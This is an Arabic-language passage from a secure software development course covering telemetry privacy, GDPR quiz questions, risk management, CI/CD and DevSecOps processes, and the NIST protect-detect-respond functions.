يتضمن البرنامج أحيانا وظائف لجمع بيانات القياس عن بعد ، أي بيانات حول كيفية استخدام البرنامج أو أدائه. غالبا ما يتم جمع بيانات القياس عن بعد من خلال آلية "منزل الهاتف" المضمنة في البرنامج نفسه ، حيث يرسل البرنامج هذه البيانات إلى مكان آخر.

بيانات القياس عن بعد محفوفة بشكل خاص بقضايا الخصوصية والسرية. عادة ما يتم تقديم خيار للمستخدمين النهائيين للاشتراك في مشاركة البيانات الإحصائية مع مطوري البرنامج ، ولكن قد لا تكون هذه الاتفاقية كافية. من الناحية المثالية ، يجب إعطاء المستخدمين النهائيين وعيا كاملا بالبيانات التي يمكن إرسالها إلى الأطراف (بما في ذلك البائع) عند استخدامهم للبرنامج ، والقدرة على التحكم في نقل البيانات هذا.

تقدم "سياسة جمع واستخدام بيانات القياس عن بعد" الخاصة بمؤسسة Linux [* مناقشة موجزة لبعض القضايا التي يجب مراعاتها قبل تنفيذ جمع بيانات*](https://www.linuxfoundation.org/telemetry-data-policy/) القياس عن بعد  ، بالإضافة إلى مناقشة نهج المؤسسة لإدارة استخدام القياس عن بعد من قبل مجتمعات المشاريع مفتوحة المصدر. قد يكون هذا مفيدا لك في سياقات أخرى.

#### اختبار 1.3: متطلبات الخصوصية

\>\>أي من العبارات التالية المتعلقة بالخصوصية صحيحة؟|| تحقق من جميع الخيارات أدناه الصحيحة ، ولا تتحقق منها بخلاف ذلك.<<

[!] لا توجد قوانين خصوصية في الولايات المتحدة. {{ محدد: لا. ليس لدى الولايات المتحدة  قانون *شامل* لخصوصية المعلومات ككل. بدلا من ذلك ، لدى الحكومة الفيدرالية الأمريكية عدد من القوانين التي تغطي ظروفا محددة مختلفة. هناك أيضا بعض قوانين الولاية. }}

[ ] اللائحة العامة لحماية البيانات (GDPR) غير ذات صلة طالما أنك تعالج البيانات الشخصية خارج أوروبا. {{ محدد: لا. تنطبق اللائحة العامة لحماية البيانات (GDPR) على أولئك الذين يعالجون البيانات الشخصية للمقيمين في أوروبا ، سواء تمت معالجتها في أوروبا أم لا. قد يكون أو لا يكون عدم الامتثال للائحة العامة لحماية البيانات (GDPR) قابلا للتنفيذ اعتمادا على مجموعة متنوعة من العوامل ، ولكنه في كثير من الحالات يكون ذا صلة كبيرة. }}

[x] بموجب اللائحة العامة لحماية البيانات ، تعتبر بعض البيانات الشخصية أكثر حساسية ، وهناك قيود أكبر على جمعها ومعالجتها. ويشمل ذلك الآراء السياسية والمعتقدات الدينية أو الفلسفية والعضوية النقابية والبيانات الجينية والبيانات المتعلقة بالصحة.

[ ] بموجب اللائحة العامة لحماية البيانات ، بمجرد منح الموافقة ، لا يمكن سحبها. {{ محدد: لا، يتطلب القانون العام لحماية البيانات (GDPR) أن يكون من الممكن للمستخدمين إلغاء الموافقة. إذا لم يكن هناك سبب قانوني آخر لإمكانية الاحتفاظ بالبيانات ومعالجتها ، فيجب مسح البيانات. }}

[ ] بموجب اللائحة العامة لحماية البيانات (GDPR) ، يكفي مربع الاختيار "أوافق" المحدد مسبقا للحصول على الموافقة. {{ مختار: لا، تتطلب الموافقة "إجراء إيجابيا واضحا". لا يتم احتساب المربعات المحددة مسبقا. }}

[x] بموجب اللائحة العامة لحماية البيانات ، يمكن لأصحاب البيانات ، في ظل ظروف معينة ، المطالبة بمسح بياناتهم الشخصية.

## كيف يمكننا الوصول إلى هناك؟

### إدارة المخاطر

المخاطر هي *مشاكل محتملة*. المفتاح لتطوير برامج آمنة بشكل كاف هو إدارة مخاطر تطوير برامج غير آمنة ، *قبل* أن تصبح مشاكل.

#### الحاجة إلى إدارة المخاطر

كل الحياة تنطوي على مخاطر. من غير الواقعي توقع عدم وجود مخاطر في الحياة. على وجه الخصوص ، هناك مخاطر على أي شخص يستخدم البرنامج الذي تقوم بتطويره لأنه قد يكون به نقاط ضعف. عند تطوير برنامج ، من المحتمل أن ترتكب أخطاء ، وقد تؤدي بعض هذه الأخطاء في النهاية إلى ثغرات أمنية. قد يحاول شخص ما إدخال نقاط ضعف أو تعليمات برمجية ضارة عن قصد في برنامجك ، أو البرنامج الذي تعتمد عليه ، أثناء تطويره. حتى التقنيات القوية جدا لمواجهة نقاط الضعف يجب أن تبني على افتراضات أو يمكنها فقط القضاء على *بعض* المخاطر المتعلقة بالأمن ، لذلك مرة أخرى ، من غير الواقعي توقع عدم وجود مخاطر.

ولكن عند تطوير برنامج ، يجب عليك اتخاذ خطوات معقولة لإدارة ** المخاطر بحيث  تكون المخاطر منخفضة جدا (لكل من مطوريها ومستخدميها) بحيث تكون مقبولة. في كتابه [* "فشل إدارة المخاطر: لماذا تم كسرها وكيفية إصلاحها" *](https://onlinelibrary.wiley.com/doi/book/10.1002/9781119198536) (2009) ، يعرف دوغلاس هوبارد إدارة المخاطر بأنها *"تحديد المخاطر وتقييمها وتحديد أولوياتها ... يليه تطبيق منسق واقتصادي للموارد لتقليل ومراقبة ومراقبة احتمال أو تأثير الأحداث المؤسفة ".*

أحد المخاطر عند تطوير البرامج ونشرها هو أن المهاجم (المهاجمين) سيستغل نقاط ضعفه ويسبب ضررا للآخرين. لا يمكنك منع المهاجمين من محاولة مهاجمة النظام. في الحقيقة:

** إذا بدأ الناس في استخدام البرنامج الذي تقوم بتطويره ، _فتوقع_ أن يحاول الخصوم الأذكياء مهاجمته.**

بينما لا يمكنك منع المهاجمين من مهاجمة البرامج ، يمكنك أن تجعل من الصعب على الهجوم النجاح ، أو تقليل التأثير إذا نجح الهجوم. يمكنك القيام بذلك عن طريق اتخاذ خطوات خلال تطوير البرامج ونشرها لتقليل المخاطر إلى مستوى منخفض مقبول. إذا كان برنامجك مستخدما على نطاق واسع أو يعتمد عليه في المهام الحيوية ، فمن المهم بشكل خاص أن تعمل على إدارة هذه المخاطر على المستخدمين.

لا ** تنتظر للتفكير في المخاطر حتى تحدث. ثم لم تعد مخاطر - إنها *مشاكل*. من الأسهل والأرخص معالجة المخاطر *قبل* أن تصبح مشاكل! من الأسهل بكثير تصميم البرنامج لتقليل المخاطر بدلا من تغيير البرنامج لاحقا. كما أنه أفضل للمستخدم وسمعتك المهنية وسمعة البرنامج وسمعة أي مؤسسة ذات صلة.

#### عملية إدارة المخاطر

يمكن للمشاريع الصغيرة ذات التأثيرات المنخفضة نسبيا إدارة المخاطر بشكل غير رسمي. يجب أن تكون المشاريع الكبيرة ذات التأثيرات الرئيسية أكثر صرامة. بغض النظر ، يمكن تقسيم إدارة المخاطر إلى الأنشطة التالية (وفقا [*لدليل إدارة المخاطر والقضايا والفرص الصادر عن وزارة الدفاع الأمريكية لبرامج الاستحواذ الدفاعي*](http://acqnotes.com/wp-content/uploads/2017/07/DoD-Risk-Issue-and-Opportunity-Management-Guide-Jan-2017.pdf) ، 2017):

1. **تخطيط المخاطر**. حدد عملية إدارة المخاطر في مشروعك.

2. **تحديد المخاطر**. حدد الخطأ الذي *قد* يحدث. الحيلة الجيدة هي البحث عن مشاريع مماثلة - ما هي المخاطر والمشاكل التي لديهم؟ من الجيد كتابة هذه القائمة حتى يمكن مشاركتها. لأغراضنا ، نحن قلقون بشأن المخاطر المتعلقة بالأمان.

3. **تحليل المخاطر**. حدد السمتين الرئيسيتين للخطر: **احتمال** وقوع الحدث غير المرغوب فيه وشدة **** عواقبه. يصبح الخطر مهما بشكل متزايد إذا زاد احتماله و / أو شدته.

4. **التعامل مع المخاطر**. حدد ما ستفعله حيال المخاطر. لديك عدة خيارات لكل خطر:

    1. **القبول (والمراقبة):** يتم قبول المخاطر ، ولكن يتم مراقبتها وإبلاغها إلى أصحاب المصلحة (بما في ذلك مستخدميها). هذا معقول إذا كان الاحتمال أو الشدة منخفضة.

    2. **التجنب**. يتم القضاء على المخاطر عن طريق إجراء بعض التغيير. أي أنك تجعل احتماله صفرا أو شدته غير ذات صلة. هذا شيء عظيم عندما يمكنك القيام بذلك. على سبيل المثال ، قد تختار *عدم* جمع بعض البيانات (ثم لا يمكنك أن تفقد سريتها لاحقا) ، أو قد تختار لغة برمجة حيث لا يمكن أن تحدث أنواع معينة من نقاط الضعف (القضاء على المخاطر من هذه الأنواع من نقاط الضعف).

    3. **زرع**. يتم نقل الخطر إلى شخص آخر (على سبيل المثال ، شراء التأمين ، أو تغيير النظام بحيث يكون هناك مكون آخر لديه هذا الخطر ويقبله مطوروه). على سبيل المثال ، بدلا من تحمل مخاطر التعريف والمصادقة السيئة (I&A) ، اعتمد على بعض الأنظمة الحالية للقيام ب I&A.

    4. **السيطرة**. تقليل المخاطر بنشاط إلى مستوى مقبول. نظرا لأن أهمية الخطر تعتمد على احتماله وشدته ، فهذا يعني تغيير الأشياء لجعل الاحتمال و / أو الشدة منخفضة (أو على الأقل أقل). بالنسبة للمخاطر المتعلقة بالأمان ، غالبا ما يكون هذا هو ما عليك القيام به. لا توجد طريقة واحدة للقيام بذلك ، لذلك عليك بدلا من ذلك تقليل الاحتمالية والشدة باستمرار من خلال تطوير البرامج ونشرها حتى تصبح المخاطر مقبولة. على سبيل المثال، يمكنك:

        1. تأكد من أن جميع المطورين يعرفون أنواعا معينة من الأخطاء الشائعة التي تؤدي إلى نوع معين من الضعف (حتى يتمكنوا من تجنبها) ،

        2. استخدام الأساليب (مثل التصميم الآمن ولغات البرمجة المحددة وواجهات برمجة التطبيقات) المصممة لتقليل احتمالية حدوث هذه الثغرات الأمنية ،

        3. استخدم الأدوات والمراجعات لاكتشاف الأخطاء (بما في ذلك نقاط الضعف) ، و

        4. تصلب النظام. يعني تصلب النظام تعديل النظام بحيث تقل احتمالية أن تصبح العيوب ثغرات أمنية. سنناقش تصلب في وقت لاحق في الدورة.

5. **مراقبة المخاطر**. حدد كيف تغيرت المخاطر بمرور الوقت. بمرور الوقت ، يجب أن "تحرق" مخاطرك - أي أن الخطوات التي تتخذها يجب أن تقلل باستمرار من احتمالية المخاطر أو شدتها إلى مستويات مقبولة.

إدارة المخاطر *ليست* معقدة. إنه في الأساس الفطرة السليمة. ولكن عندما تعمل على حل المشكلات الحالية ، فمن السهل نسيان المخاطر ، وهي مجرد ** مشاكل محتملة. القليل من التفكير *في وقت مبكر* يمكن أن يزيل المشاكل المحتملة قبل أن تصبح مشاكل حقيقية.

#### تحديد المخاطر

لاحظ أن الخطوة الأولى (بعد التخطيط) هي تحديد المخاطر. ولكن كيف يمكنك تحديد مخاطر الثغرات الأمنية؟ من الواضح أن الكثير من الناس *لا* يلاحظون مخاطر الثغرات الأمنية.

لدى بروس شناير هذه القصة الرائعة ([*عقلية الأمن *](https://www.schneier.com/blog/archives/2008/03/the_security_mi_1.html)، 2008):

> *"العم ميلتون للصناعات تبيع مزارع النمل للأطفال منذ عام 1956. قبل بضع سنوات ، أتذكر فتح واحدة مع صديق. لم يكن هناك نمل فعلي مدرج في الصندوق. بدلا من ذلك ، كانت هناك بطاقة قمت بملئها بعنوانك ، وكانت الشركة ترسل لك بعض النمل بالبريد. أعرب صديقي عن دهشته من أنه يمكنك إرسال النمل إليك عبر البريد. [بروس شناير] أجاب: "الأمر المثير للاهتمام حقا هو أن هؤلاء الأشخاص سيرسلون أنبوبا من النمل الحي إلى أي شخص تخبرهم به". يتطلب الأمن عقلية معينة. يرى محترفو الأمن - على الأقل الجيدون منهم - العالم بشكل مختلف. لا يمكنهم الدخول إلى متجر دون أن يلاحظوا كيف يمكنهم سرقة المتاجر. لا يمكنهم استخدام جهاز كمبيوتر دون التساؤل عن الثغرات الأمنية. لا يمكنهم التصويت دون محاولة معرفة كيفية التصويت مرتين".*

هل يمكن تدريس هذه العقلية؟ تجربتنا هي أنه يمكن أن يكون ، على الأقل جزئيا. تساعد قوائم المراجعة والإرشادات والنصائح في تذكير الأشخاص بالبحث عن أشياء معينة ، خاصة عندما يتم إنشاؤها من تجارب سابقة ذات صلة. تقنية أخرى تساعد هي العمل على تطوير عقلية بجنون العظمة قليلا. ليس مستوى سريريا من جنون العظمة ، ولكن قلق مستمر منخفض المستوى من وجود العديد من المخاطر وأن بعض الأشخاص يخرجون حقا للحصول عليك. تذكر أن بعض المستخدمين سيسعون عمدا إلى التسبب في مواقف نادرة أو غير محتملة أو غير متوقعة ، على أمل أن تمنحهم مثل هذه الهجمات امتيازات لا مبرر لها. نتيجة لذلك ، عند كتابة برامج آمنة ، فإن جنون العظمة فضيلة. يمكن أن يساعد التحدث عن المخاطر مع الآخرين ، ومراجعة الخطط مع الآخرين ، والبحث المستمر عن المخاطر في تحديد المخاطر بحيث يمكن معالجتها *قبل* أن تصبح مشاكل.

#### الأمن عملية وليس منتجا

في مقالته ، [*عملية الأمن*](https://www.schneier.com/essays/archives/2000/04/the_process_of_secur.html) (2000) ، أوضح بروس شناير ذلك

> *"الأمن عملية وليس منتجا ... لا يوجد شيء اسمه أمان مثالي. ومن المثير للاهتمام أن هذه ليست مشكلة بالضرورة. ... لا يجب أن يكون الأمن مثاليا ، ولكن يجب أن تكون المخاطر قابلة للإدارة ...".*

العالم يتغير. تتغير طرق استخدام البرنامج. تم اكتشاف ثغرات أمنية جديدة. تتغير منصة البرنامج والمكتبات. تتغير القوانين وسياسات الشركة والأهداف. قد لا تكون البرامج التي كانت آمنة قبل عام أو خمس سنوات كافية اليوم.

بما أن الأمن عملية ، فهو ليس مجرد "نار وننسى". تحتاج إلى التفكير باستمرار في الأمان.

#### قوائم المراجعة ليست أمنية

لا تساوي بين قوائم المراجعة والإرشادات والنصائح والأمان. غالبا ما تكون *مفيدة* ، لأنها يمكن أن تساعدك في تحديد المخاطر والطرق المعقولة للتعامل معها. يمكن أن توفر لك قوائم المراجعة والإرشادات والنصائح الجيدة الكثير من الوقت والمتاعب ، كما أنها تساعد بشكل كبير لمساعدة الآخرين على تقييم أمان بعض البرامج. الأشياء الجيدة مبنية على تجربة الآخرين ، وسيكون من الغباء تجاهل هذه التجربة.

لكنها ليست سوى مساعدات للهدف الحقيقي؛ فهي ليست الهدف نفسه. يمكنك اتباع قوائم المراجعة والإرشادات والنصائح ، ولديك برامج غير آمنة بشكل رهيب. يمكنك أيضا *تجاهل* بعض البرامج غير المناسبة ولديك برامج آمنة للغاية. باختصار:

**_لا يوجد بديل للتفكير._**

ستمنحك هذه الدورة عددا من النصائح لمساعدتك على تقليل المخاطر ، مع التركيز على الدروس التي تعلمها المطورون السابقون. لكنها مجرد نصائح. إنها مجرد *مساعدة* لتطوير برامج آمنة. عندما تقوم بتطوير برنامج ، فكر باستمرار في الطرق التي قد يحاول بها المهاجم استغلال نظامك. توقع المشاكل المحتملة - بينما لا تزال مخاطر - والتخفيف من حدتها.

#### اختبار 1.4: إدارة المخاطر

\>\>الغرض من تطوير برامج آمنة هو القضاء على جميع المخاطر الأمنية المحتملة. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. سيكون من الرائع أن نتمكن من القضاء على جميع المخاطر ، لكن هذا غير معقول. بدلا من ذلك ، هدفنا هو تقليل احتمالية وشدة جميع المخاطر ، بما في ذلك الثغرات الأمنية ، إلى مستويات مقبولة.

[تفسير]

### عمليات التطوير / الدفاع في اتساع

لا توجد آلية سحرية واحدة لصنع برامج آمنة. بدلا من ذلك ، عليك التفكير باستمرار في الأمان طوال تطوير البرامج ونشرها. النظر في الأمن في جميع الأوقات ، من خلال جميع عمليات التطوير والنشر ، يسمى أحيانا "الدفاع في الاتساع". لذلك دعونا نتحدث عن العمليات المستخدمة لتطوير البرامج ونشرها.

#### عمليات تطوير ونشر البرامج الفردية

عندما تقوم بتطوير برنامج ، هناك عمليات معينة يتعين على جميع المطورين القيام بها. وتشمل هذه:

* تحديد *المتطلبات* (ما يجب أن يفعله البرنامج). للأمان ، تأكد من معرفة متطلبات الأمان التي يجب توفيرها. على سبيل المثال ، هل هناك بيانات يجب أن تحافظ على سريتها؟

* تحديد *التصميم المعماري* (كيفية تقسيم المشكلة إلى مكونات متفاعلة لحلها). في وقت لاحق من هذه الدورة ، سنناقش العديد من مبادئ التصميم الآمن لمساعدتك في تصميم نظام يسهل تأمينه.

* *حدد المكونات* القابلة لإعادة الاستخدام  (حدد الحزم / المكتبات القابلة لإعادة الاستخدام التي ستستخدمها). تحتاج إلى تقييم المكونات التي ستستخدمها ، لأن أيا من نقاط الضعف الخاصة بها قد تصبح نقاط ضعف في البرنامج الذي تقوم بتطويره. تأتي هذه المكونات المعاد استخدامها من مكان ما ، وتعتمد بشكل عابر على مكونات أخرى. مجموعة كل هذه التبعيات ، بما في ذلك من أين أتت وكيف تصل إليك في النهاية ، هي *سلسلة التوريد* الخاصة بك.

* *تنفيذه* (كتابة التعليمات البرمجية). معظم الثغرات الأمنية التي تحدث أثناء التنفيذ هي أنواع شائعة محددة. بمجرد أن تعرف ما هي ، يمكنك تجنبها.

* *تحقق من* ذلك (كتابة / تنفيذ الاختبارات واستخدام المحللين لاكتساب الثقة في أنه يفعل ما يفترض به). يجب أن تختبر للتأكد من أن نظامك آمن ، واستخدام أدوات لمساعدتك في العثور على نقاط الضعف قبل أن يعثر عليها المهاجمون.

* *انشرها* . يجب أن تساعد في التأكد من أن المستخدمين يمكنهم الحصول على الإصدار الصحيح ، وأنه آمن افتراضيا ، وأنه يمكنهم تشغيله بسهولة بطريقة آمنة.

#### استخدام هذه العمليات معا

بالطبع ، تحتاج إلى استخدام هذه العمليات معا.

من الأخطاء الشائعة محاولة تنفيذ عمليات تطوير البرامج هذه في تسلسل صارم (معرفة جميع المتطلبات ، ثم العمل على التصميم بالكامل ، ثم تنفيذ النظام بأكمله ، ثم التحقق منه). تسمى محاولة إنشاء برنامج في هذا التسلسل الصارم نموذج *الشلال*. نموذج الشلال مخادع لأن القيام بهذه العمليات في تسلسل صارم *يبدو* صارما ومعقولا في البداية. في عام 1970 ، أوضح ونستون دبليو رويس في مقالته [*إدارة تطوير الأنظمة الكبيرة: المفاهيم والتقنيات*](https://dl.acm.org/doi/10.5555/41765.41801) لماذا محاولة اتباع هذه العمليات في تسلسل صارم ("الشلال") محفوفة بالمخاطر للغاية في معظم الظروف ويجب تجنبها عادة.

خطأ شائع آخر هو تنفيذ مكونات البرامج بشكل مستقل وعدم دمجها واختبارها معا حتى يكتمل كل شيء بشكل مستقل. عادة ما يكون هذا خطأ ، لأن هذا يؤدي إلى مشاكل خطيرة في جعل المكونات تعمل معا.

في الممارسة العملية ، تنفذ معظم عمليات تطوير البرامج هذه العمليات بالتوازي ، وترتد المعلومات بين العمليات مع تعلم معلومات جديدة. هناك العديد من الطرق للجمع بين العمليات ، والتي تعتمد على العديد من العوامل مثل حجم الفريق ومدى موثوقية النتيجة. هناك العديد من الأساليب المختلفة المختلفة ، بما في ذلك العديد من مناهج تطوير Agile و Progressive و Evolutionary و Waterfall المختلفة. لأغراض هذه الدورة ، سنركز على الجوانب الأمنية كلما اخترت تطبيق بعض العمليات ، وليس كثيرا على هذه التفاصيل. حتى تتمكن من تطبيق مواد هذه الدورة بغض النظر عن النهج الذي تستخدمه. ومع ذلك ، دعونا نلقي نظرة على بعض الممارسات والمصطلحات المحددة التي يمكن أن تكون مهمة للأمان.

من الممارسات الموصى بها للغاية استخدام التكامل المستمر (CI) ، وهي ممارسة دمج نسخ العمل من التطوير بشكل متكرر في خط رئيسي مشترك (على سبيل المثال ، مرة كل بضعة أيام من خلال عدة مرات في اليوم). يقلل هذا الدمج الروتيني من مخاطر عدم عمل المكونات معا إذا تأخر التكامل إلى وقت لاحق ، وهذا أمر جيد. ومع ذلك ، يتطلب CI الناجح طريقة لتحديد ما إذا كانت المكونات تعمل معا بالفعل. يتم حل ذلك باستخدام خط أنابيب CI - وهي عملية يتم تشغيلها كلما تم دمج شيء ما للتأكد من أنه يبني ويجتاز مجموعة من الاختبارات الآلية والفحوصات الأخرى.

ترغب العديد من المؤسسات في نشر البرامج / الخدمات بسرعة أكبر ، وقد تبنت طرقا مختلفة للقيام بذلك بناء على عمليات تطوير البرامج القياسية هذه. تختلف التعريفات ، ولكن إليك بعض المصطلحات الشائعة:

* يهدف التسليم المستمر (CD أو CDE) إلى ضمان * "أن يكون التطبيق دائما في حالة جاهزية للإنتاج بعد اجتياز الاختبارات الآلية وفحوصات الجودة بنجاح [من خلال توظيف الممارسات] لتقديم البرامج تلقائيا إلى بيئة شبيهة بالإنتاج"* (مجتبى شاهين ومحمد علي بابار وليمينغ تشو ، [*التكامل المستمر والتسليم والنشر: مراجعة منهجية للنهج والأدوات والتحديات والممارسات*](https://arxiv.org/abs/1703.07019) , 2017). لاحظ أن البرنامج لا يتم إصداره أو نشره بالضرورة بدون خطوة موافقة منفصلة.

* النشر المستمر (CD)  "*يخطو خطوة إلى الأمام [من التسليم المستمر] وينشر التطبيق تلقائيا وبشكل مستمر في بيئات الإنتاج أو العملاء"* (مجتبى شاهين ومحمد علي بابار وليمينغ تشو [* ، التكامل المستمر والتسليم والنشر: مراجعة منهجية للنهج والأدوات والتحديات والممارسات *](https://arxiv.org/abs/1703.07019)، 2017).

* تركز DevOps على التنسيق والتعاون بين فرق تطوير البرمجيات (Dev) وعمليات تكنولوجيا المعلومات (Ops) (Mike Loukides  ، [*إعادة النظر في "What Is DevOps"*](http://radar.oreilly.com/2014/06/revisiting-what-is-devops.html) ، 2014) ، على سبيل المثال ، لتقصير وقت التطوير والنشر. في الممارسة العملية ، يتضمن هذا عادة التسليم المستمر (CDE) وقد يتضمن النشر المستمر (CD).

* DevSecOps (وتسمى أيضا SecDevOps) هي DevOps ، ولكنها تدمج على وجه التحديد المخاوف الأمنية في عملية التطوير والعمليات (Red Hat ، [*ما هي DevSecOps؟ *](https://www.redhat.com/en/topics/devops/what-is-devsecops))

* GitOps "هي طريقة لتنفيذ النشر المستمر للتطبيقات السحابية الأصلية. يركز على تجربة تتمحور حول المطور عند تشغيل البنية التحتية ، باستخدام أدوات يعرفها المطورون بالفعل ، بما في ذلك أدوات Git والنشر المستمر.  الفكرة الأساسية ل GitOps هي وجود مستودع Git يحتوي دائما على أوصاف تعريفية للبنية التحتية المطلوبة حاليا في بيئة الإنتاج وعملية آلية لجعل بيئة الإنتاج تتطابق مع الحالة الموصوفة في المستودع. إذا كنت ترغب في نشر تطبيق جديد أو تحديث تطبيق موجود ، فأنت تحتاج فقط إلى تحديث المستودع - تتعامل العملية الآلية مع كل شيء آخر" لكل <https://www.gitops.tech/>. تعريفات مماثلة هي "يستخدم GitOps مستودعات Git كمصدر واحد للحقيقة لتقديم البنية التحتية كرمز." (ريد هات ،  [*ما هو جيتوبس؟*](https://www.redhat.com/en/topics/devops/what-is-gitops) ) و"GitOps هو إطار تشغيلي يأخذ أفضل ممارسات DevOps المستخدمة لتطوير التطبيقات مثل التحكم في الإصدار والتعاون والامتثال و CI / CD ، ويطبقها على أتمتة البنية التحتية." (جيتلاب,  [*ما هو جيت أوبس؟ *](https://about.gitlab.com/topics/gitops/)).

كل هذا يعتمد على الاختبارات الآلية وفحوصات الجودة ، ومن منظور أمني ، ما هو مهم هو أن أدوات التحقق من الثغرات الأمنية والمشكلات الأمنية المحتملة تحتاج إلى دمجها في تلك الاختبارات الآلية وفحوصات الجودة. على سبيل المثال ، يجب عليك التأكد من وجود الأدوات في خط أنابيب CI الخاص بك والتي تتحقق من مشكلات الأمان المختلفة ، بحيث يتم اكتشاف أي مشكلات أمنية مبكرا. قد يتم تشغيل أدوات الأمان التي تستغرق وقتا طويلا للتشغيل بالتوازي ولكن يمكن استخدامها ك "بوابة" ل CDE. سنناقش المزيد حول أدوات دعم الأمان لاحقا في الدورة التدريبية.

إن مجرد إدخال بعض "أدوات الأمان" في مجموعة اختبار آلية ، في حد ذاته ، يميل إلى أن يكون غير فعال. لن تعرف أدوات الأمان بشكل عام ما يفترض أن يفعله البرنامج (المتطلبات). على سبيل المثال ، لن تعرف أدوات الأمان المعلومات السرية. لا تستطيع أدوات الأمان عادة اكتشاف المشكلات الأساسية في تصميم البرنامج ، وحتى لو أمكنها ذلك ، فإن إصلاح مشكلات التصميم ليس ما تفعله أدوات الكشف.  غالبا ما تفوت أدوات الأمان نقاط الضعف ، خاصة إذا كان البرنامج سيئ التصميم. وربما الأهم من ذلك ، أن المعلومات من أدوات الأمان لا معنى لها بشكل عام للمطورين إذا لم يكن لديهم فهم أساسي للأمان. هناك عبارة قديمة لا تزال صحيحة: *"أحمق مع أداة لا يزال أحمق*".

**باختصار:** الأدوات مهمة ، لكنها ليست كافية. يجب أن تفكر باستمرار في الأمان طوال عملية التطوير والنشر، بغض النظر عما تفعله، حتى تتمكن من تحديد المخاطر المتعلقة بالأمان والتعامل معها. ضع في اعتبارك كيف يمكن أن يتعرض نظامك للهجوم (تحديد مخاطره) ، وقم بتحليل المخاطر لتحديد مدى احتمالية استغلال النظام وشدته إذا كان كذلك ، ثم قرر ما يجب القيام به. يتضمن ذلك بالتأكيد إضافة أدوات أمان في خط أنابيب التكامل المستمر ، ولكن هذه الأدوات ستكون أكثر فاعلية إذا فكرت في الأمان طوال فترة التطوير والنشر. في بقية هذه الدورة سنغطي كيفية القيام بذلك. سنناقش الأدوات في النهاية ، ولكن فقط بعد أن نفهم ما تساعدنا الأدوات في القيام به.

يجب عليك أيضا التركيز على التحسين المستمر ، لكل من البرنامج نفسه والعمليات التي تستخدمها لتطويره. إذا كان من الصعب استخدام التصميم الحالي أو واجهة برمجة التطبيقات بشكل آمن ، فاجعله سهل الاستخدام بأمان. ابحث عن طرق لتقوية البرنامج ضد الهجمات. يمكنك تعديل عمليات إثبات الملكية عن طريق إضافة أدوات جديدة، أو تغيير تكوين الأدوات الموجودة، لاكتشاف المشكلات بشكل متزايد قبل إصدارها للمستخدمين.

#### اختبار 1.5: عمليات التطوير / الدفاع في اتساع

\>\>لتطوير برنامج آمن ، يجب عليك دائما تطوير جميع المتطلبات بدقة ، ثم تطوير التصميم الكامل الخاص بك ، وبعد ذلك فقط تبدأ في تنفيذ البرنامج. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. هذا نهج "شلال" وهو عموما طريقة محفوفة بالمخاطر لتطوير البرمجيات. أنت بحاجة إلى فكرة عما تحاول تحقيقه ، بالطبع ، لكن الواقع أكثر تعقيدا: أثناء التصميم والتنفيذ والميدان ، ستحصل على تعليقات حول ما *يجب أن* تكون عليه المتطلبات حقا.

[تفسير]

#### اختبار 1.6: عمليات التطوير / الدفاع في اتساع

\>\>لتطوير برنامج آمن، ما عليك سوى إضافة أدوات الأمان إلى خط أنابيب التكامل المستمر. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح ، لكنه سؤال متستر لأن هناك ذرة من الحقيقة فيه.

من المهم أن يكون لديك أدوات أمان في خط أنابيب التكامل المستمر. بغض النظر عن مدى جودة نهج التصميم والتنفيذ الخاص بك ، فسوف ترتكب أخطاء ، وستساعدك الأدوات الموجودة في خط أنابيب التكامل المستمر في العثور على بعض هذه الأخطاء.

لكن مجرد "إضافة أدوات الأمان" لا يكفي. لا يمكن لأي أداة إصلاح تصميم سيئ ، وستفقد الأدوات نقاط الضعف في التنفيذ. يجب أن تفكر في الأمان بغض النظر عما تفعله أثناء التطوير والعمليات.

[تفسير]

### الحماية والكشف والاستجابة

تم تطوير البرنامج ليتم استخدامه ، لذلك دعونا نلقي نظرة موجزة على الأمان من وجهة نظر العمليات.

يجب ألا تفترض المؤسسات أنه يمكنها دائما حماية أنظمتها من الهجوم. المهاجمون يخترقون في بعض الأحيان. على سبيل المثال،  يحدد [إطار عمل الأمن السيبراني للمعهد الوطني للمعايير والتكنولوجيا في الولايات المتحدة](https://www.nist.gov/cyberframework) خمس وظائف متزامنة ومستمرة يجب على المؤسسات تطبيقها في عملياتها لإدارة مخاطر الأمن السيبراني:

1. **تحديد**<br>*"تطوير فهم تنظيمي لإدارة مخاطر الأمن السيبراني على الأنظمة والأشخاص والأصول والبيانات والقدرات".*

2. **حماية**<br>*"وضع وتنفيذ ضمانات مناسبة لضمان **** تقديم الخدمات الحيوية".*

3. **الكشف**<br> عن * "تطوير وتنفيذ الأنشطة المناسبة لتحديد حدوث حدث الأمن السيبراني".*

4. **الاستجابة**<br> "تطوير وتنفيذ الأنشطة المناسبة لاتخاذ إجراءات بشأن حادث الأمن السيبراني المكتشف".

5. **الاسترداد**<br>*"تطوير وتنفيذ الأنشطة المناسبة للحفاظ على خطط المرونة واستعادة أي قدرات أو خدمات ضعفت بسبب حادث يتعلق بالأمن السيبراني".*

يتم أحيانا تبسيط هذه القائمة المكونة من خمس وظائف إلى ثلاث وظائف أساسية: **الحماية** **والكشف** **والاستجابة**. عند استخدام هذه القائمة المبسطة المكونة من ثلاث وظائف أساسية ، يعتبر التحديد جزءا من الحماية ، ويعتبر الاسترداد جزءا من الاستجابة. سنستخدم هذه القائمة المختصرة للوظائف الأساسية هنا.

لا تعتبر أي من هذه الوظائف الأساسية الثلاث (الحماية والكشف والاستجابة) فعالة في حد ذاتها. إذا كنت تحمي فقط ، ولكن لا تكتشف أو تتعافى ، فإن المهاجم الذي يخترق دفاعاتك يمكنه فعل ما يريد. إذا اكتشفت أو تعافيت فقط ، دون حماية نظامك ، فلن تنجز أي عمل أبدا ؛ بدلا من ذلك ، ستقضي كل وقتك في الكشف أو الاسترداد ، وسرعان ما لن يثق أحد في نظامك. بالإضافة إلى ذلك ، لا فائدة من الاسترداد بدون اكتشاف ، لأنك غالبا لن تعرف *متى* تتعافى.

